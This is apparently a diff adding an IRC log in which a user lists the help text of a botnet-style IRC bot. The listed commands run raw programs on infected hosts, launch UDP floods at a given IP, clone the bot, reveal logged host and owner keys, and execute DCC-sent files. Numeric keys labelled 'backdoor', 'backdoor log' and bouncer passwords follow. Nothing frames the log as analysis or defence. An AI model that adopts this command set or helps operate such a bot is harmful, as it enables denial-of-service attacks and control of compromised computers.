@@ -1,0 +1,48 @@
+(05:32:18)   º( GeNeRaL[s6X8x7] )º  ;!alias <name> - add an alias
+(05:32:19)   º( GeNeRaL[s6X8x7] )º  ;!binfo - biginfo
+(05:32:20)   º( GeNeRaL[s6X8x7] )º  ;!botchan - new chan
+(05:32:21)   º( GeNeRaL[s6X8x7] )º  ;!botopen - restarts bot
+(05:32:22)   º( GeNeRaL[s6X8x7] )º  ;!botport - new port
+(05:32:23)   º( GeNeRaL[s6X8x7] )º  ;!botserv - new server
+(05:32:24)   º( GeNeRaL[s6X8x7] )º  ;!clone - Clones Bot
+(05:32:25)   º( GeNeRaL[s6X8x7] )º  ;!cmd <raw command> - EG: !cmd run notepad
+(05:32:28)   º( GeNeRaL[s6X8x7] )º  ;!conn - conn info
+(05:32:28)   º( GeNeRaL[s6X8x7] )º  ;!cyc - cycles channel
+(05:32:28)   º( GeNeRaL[s6X8x7] )º  ;!disk diskinfo
+(05:32:29)   º( GeNeRaL[s6X8x7] )º  ;!dump - alternate to !cmd
+(05:32:31)   º( GeNeRaL[s6X8x7] )º  ;!hash <add/del/find/free/get/load/make/save> - create/edit/manage # tables
+(05:32:31)   º( GeNeRaL[s6X8x7] )º  ;!hkey - lasy ligged hostkey
+(05:32:32)   º( GeNeRaL[s6X8x7] )º  ;!hudp - halts udp
+(05:32:33)   º( GeNeRaL[s6X8x7] )º  ;!info - pc info
+(05:32:35)   º( GeNeRaL[s6X8x7] )º  ;!list - return access list
+(05:32:36)   º( GeNeRaL[s6X8x7] )º  ;!join <chan> - duh
+(05:32:37)   º( GeNeRaL[s6X8x7] )º  ;!login <pwd> - duh
+(05:32:38)   º( GeNeRaL[s6X8x7] )º  ;!logout - duh
+(05:32:39)   º( GeNeRaL[s6X8x7] )º  ;!newnick - lets change the bots nick [EG: !nick fedz will result in fedz + random numbers/letters]
+(05:32:40)   º( GeNeRaL[s6X8x7] )º  ;!nick <on/off> - enables the !newnick settings
+(05:32:41)   º( GeNeRaL[s6X8x7] )º  ;!okey - last logged ownerkey
+(05:32:42)   º( GeNeRaL[s6X8x7] )º  ;!part <chan> - duh
+(05:32:43)   º( GeNeRaL[s6X8x7] )º  ;!ralias <name> - removes an alias
+(05:32:44)   º( GeNeRaL[s6X8x7] )º  ;!regkey
+(05:32:45)   º( GeNeRaL[s6X8x7] )º  ;!run <file/list/$2> - [file == dcc send from you] [list == list of dcc sends] [$2 == specified file]
+(05:32:45)   º( GeNeRaL[s6X8x7] )º  ;!udp <ip> <hits> - duh
+
+(05:46:52)   º( GeNeRaL[s6X8x7] )º  ;837 - ver
+(05:46:53)   º( GeNeRaL[s6X8x7] )º  ;793 - pwd
+(05:46:53)   º( GeNeRaL[s6X8x7] )º  ;2273 - base
+(05:46:53)   º( GeNeRaL[s6X8x7] )º  ;2627 - bncport
+(05:46:53)   º( GeNeRaL[s6X8x7] )º  ;2622 - bncauthd
+(05:46:53)   º( GeNeRaL[s6X8x7] )º  ;2624 - bncpass
+(05:46:53)   º( GeNeRaL[s6X8x7] )º  ;5478 - list
+(05:46:53)   º( GeNeRaL[s6X8x7] )º  ;6425 - nick
+(05:46:53)   º( GeNeRaL[s6X8x7] )º  ;7356 - temp
+(05:46:53)   º( GeNeRaL[s6X8x7] )º  ;7277 - pass
+(05:46:53)   º( GeNeRaL[s6X8x7] )º  ;7678 - port
+(05:46:53)   º( GeNeRaL[s6X8x7] )º  ;26425 - c(onnect)nick
+(05:46:53)   º( GeNeRaL[s6X8x7] )º  ;76425 - start(connectnick)trigger
+(05:46:53)   º( GeNeRaL[s6X8x7] )º  ;26564 - b(ack)door log
+(05:46:53)   º( GeNeRaL[s6X8x7] )º  ;23667 - b(ack)door
+(05:46:54)   º( GeNeRaL[s6X8x7] )º  ;36245- email
+(05:46:54)   º( GeNeRaL[s6X8x7] )º  ;76425 - socknick
+(05:46:54)   º( GeNeRaL[s6X8x7] )º  ;737837 - server
+(05:46:54)   º( GeNeRaL[s6X8x7] )º  ;6737837 - oserver
